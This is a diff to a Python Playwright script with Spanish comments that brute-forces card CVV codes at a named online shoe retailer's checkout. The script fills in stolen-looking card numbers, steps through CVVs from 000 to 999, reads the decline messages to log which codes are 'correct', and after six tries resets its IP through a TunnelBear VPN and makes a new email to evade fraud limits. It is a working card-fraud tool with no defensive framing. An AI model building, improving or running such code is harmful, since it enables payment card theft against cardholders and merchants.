@@ -106,8 +106,10 @@ def preparar_checkout(page):
     except:
         pass
 
-def editar_y_rellenar_pago(page, numero, mes, ano, cvv, nombre_tarjeta="hysteria"):
+def editar_y_rellenar_pago(page, numero, mes, ano, cvv, nombre_tarjeta="hysteria", intento=1, max_intentos=6):
     try:
+        if intento > max_intentos:
+            return "MAX_INTENTOS"
         if page.locator('button#edit-payment-information').is_visible():
             page.locator('button#edit-payment-information').click()
             page.locator('input#name').wait_for(state="visible", timeout=5000)
@@ -133,22 +135,26 @@ def editar_y_rellenar_pago(page, numero, mes, ano, cvv, nombre_tarjeta="hysteria
             page.locator('button[data-autotag="place-order-btn"]').click()
 
         mensaje = capturar_mensaje_alerta(page)
-        evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page)
+        return evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_intentos)
 
     except Exception as e:
         print(f"Error en editar_y_rellenar_pago: {e}")
+        return None
 
-def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page):
+def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_intentos):
     if "does not match" in mensaje or page.get_by_text("CVV2/CID does not match").is_visible():
         print(Fore.RED + f"\u2716 {numero}|{mes}|{ano}|{cvv} -> CVV INCORRECTO" + Style.RESET_ALL)
         with open(CVV_INVALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
         siguiente = str(int(cvv) + 1).zfill(3)
-        if int(siguiente) <= 999:
-            editar_y_rellenar_pago(page, numero, mes, ano, siguiente)
+        if int(siguiente) <= 999 and intento < max_intentos:
+            return siguiente  # Devuelve el siguiente CVV para seguir iterando
+        elif intento >= max_intentos:
+            print("Se alcanzó el máximo de intentos de CVV.")
+            return "MAX_INTENTOS"
         else:
             print("Todos los CVVs posibles han sido probados sin éxito.")
-        return
+        return None
 
     if "declined" in mensaje or page.get_by_text("Your transaction was declined. Please use an alternative payment method.").is_visible():
         print(Fore.GREEN + f"\u2611 {numero}|{mes}|{ano}|{cvv} -> CVV CORRECTO" + Style.RESET_ALL)
@@ -161,51 +167,83 @@ def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page):
 
     if page.get_by_text("verify your payment information").is_visible():
         print("TARJETA BLOQUEADA: DEAD")
-        return
+        return None
 
     if page.get_by_text("contact your bank to release the hold").is_visible():
         print(f"RESULTADO DUDOSO: CVV CORRECTO (posiblemente bloqueada) : {cvv}")
         with open(CVV_VALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}, posiblemente bloqueada\n")
-        return
+        return None
 
     print(f"CVV ERROR DESCONOCIDO: {cvv}")
     with open(CVV_INVALIDOS_FILE, "a") as f:
         f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
+    return None
+
+import subprocess
+
+def toggle_tunnelbear():
+    ahk_path = r"C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe"
+    script_path = os.path.abspath("scripttunnelbear.ahk")
+    print(f"Running AutoHotkey script: {script_path}")
+    subprocess.run([ahk_path, script_path], check=True)
 
 def procesar_tarjeta(tarjeta_linea):
     numero, mes, ano = tarjeta_linea.split("|")
-    email = generar_email()
     chrome_path = get_chrome_path()
-
-    with sync_playwright() as p:
-        browser = p.chromium.launch(headless=False, executable_path=chrome_path)
-        context = browser.new_context()
-        page = context.new_page()
-
-        try:
-            page.goto("https://www.shoedazzle.com/products/Brooks-Western-Boot-HS2500629-9241")
-            page.get_by_role("button", name="Close").click()
-            page.get_by_role("button", name="VIP Add to Bag").click()
-            page.get_by_role("textbox", name="Email*").fill(email)
-            page.get_by_role("textbox", name="Password (6 character minimum)*").fill("hysteria100@")
-            page.get_by_role("button", name="Continue").click()
-            time.sleep(2)
-            for _ in range(5):
-                page.locator('[data-autotag="pdp_add_to_cart"]').click()
-                time.sleep(1)
-
-            preparar_checkout(page)
-            start_cvv = get_start_cvv(numero, mes, ano)
-            if start_cvv:
-                editar_y_rellenar_pago(page, numero, mes, ano, start_cvv)
-
-        except Exception as e:
-            print(f"[{numero}] Error: {e}")
-
-        finally:
-            context.close()
-            browser.close()
+    start_cvv = get_start_cvv(numero, mes, ano)
+    max_intentos = 6
+    cvv_actual = start_cvv
+    email = generar_email()
+    while cvv_actual:
+        intento = 1
+        next_cvv = None
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=False, executable_path=chrome_path)
+            context = browser.new_context()
+            page = context.new_page()
+            try:
+                page.goto("https://www.shoedazzle.com/products/Brooks-Western-Boot-HS2500629-9241")
+                page.get_by_role("button", name="Close").click()
+                page.get_by_role("button", name="VIP Add to Bag").click()
+                page.get_by_role("textbox", name="Email*").fill(email)
+                page.get_by_role("textbox", name="Password (6 character minimum)*").fill("hysteria100@")
+                page.get_by_role("button", name="Continue").click()
+                time.sleep(2)
+                for _ in range(5):
+                    page.locator('[data-autotag="pdp_add_to_cart"]').click()
+                    time.sleep(1)
+                preparar_checkout(page)
+                while cvv_actual and intento <= max_intentos:
+                    resultado = editar_y_rellenar_pago(page, numero, mes, ano, cvv_actual, intento=intento, max_intentos=max_intentos)
+                    if resultado == "MAX_INTENTOS":
+                        next_cvv = str(int(cvv_actual) + 1).zfill(3) if int(cvv_actual) < 999 else None
+                        break
+                    elif resultado and resultado.isdigit():
+                        cvv_actual = resultado
+                        intento += 1
+                    else:
+                        next_cvv = None
+                        break
+            except Exception as e:
+                print(f"[{numero}] Error: {e}")
+            finally:
+                context.close()
+                browser.close()
+        if next_cvv:
+            print("Reiniciando IP con TunnelBear...")
+            try:
+                toggle_tunnelbear()  # Apagar VPN
+                time.sleep(3)
+                toggle_tunnelbear()  # Prender VPN
+                time.sleep(15)
+            except Exception as e:
+                print(f"Error al ejecutar el script de TunnelBear: {e}")
+            cvv_actual = next_cvv
+            email = generar_email()  # Generar nuevo email tras reinicio VPN
+            continue
+        else:
+            break
 
 def main():
     if not os.path.exists(DATA_FILE):
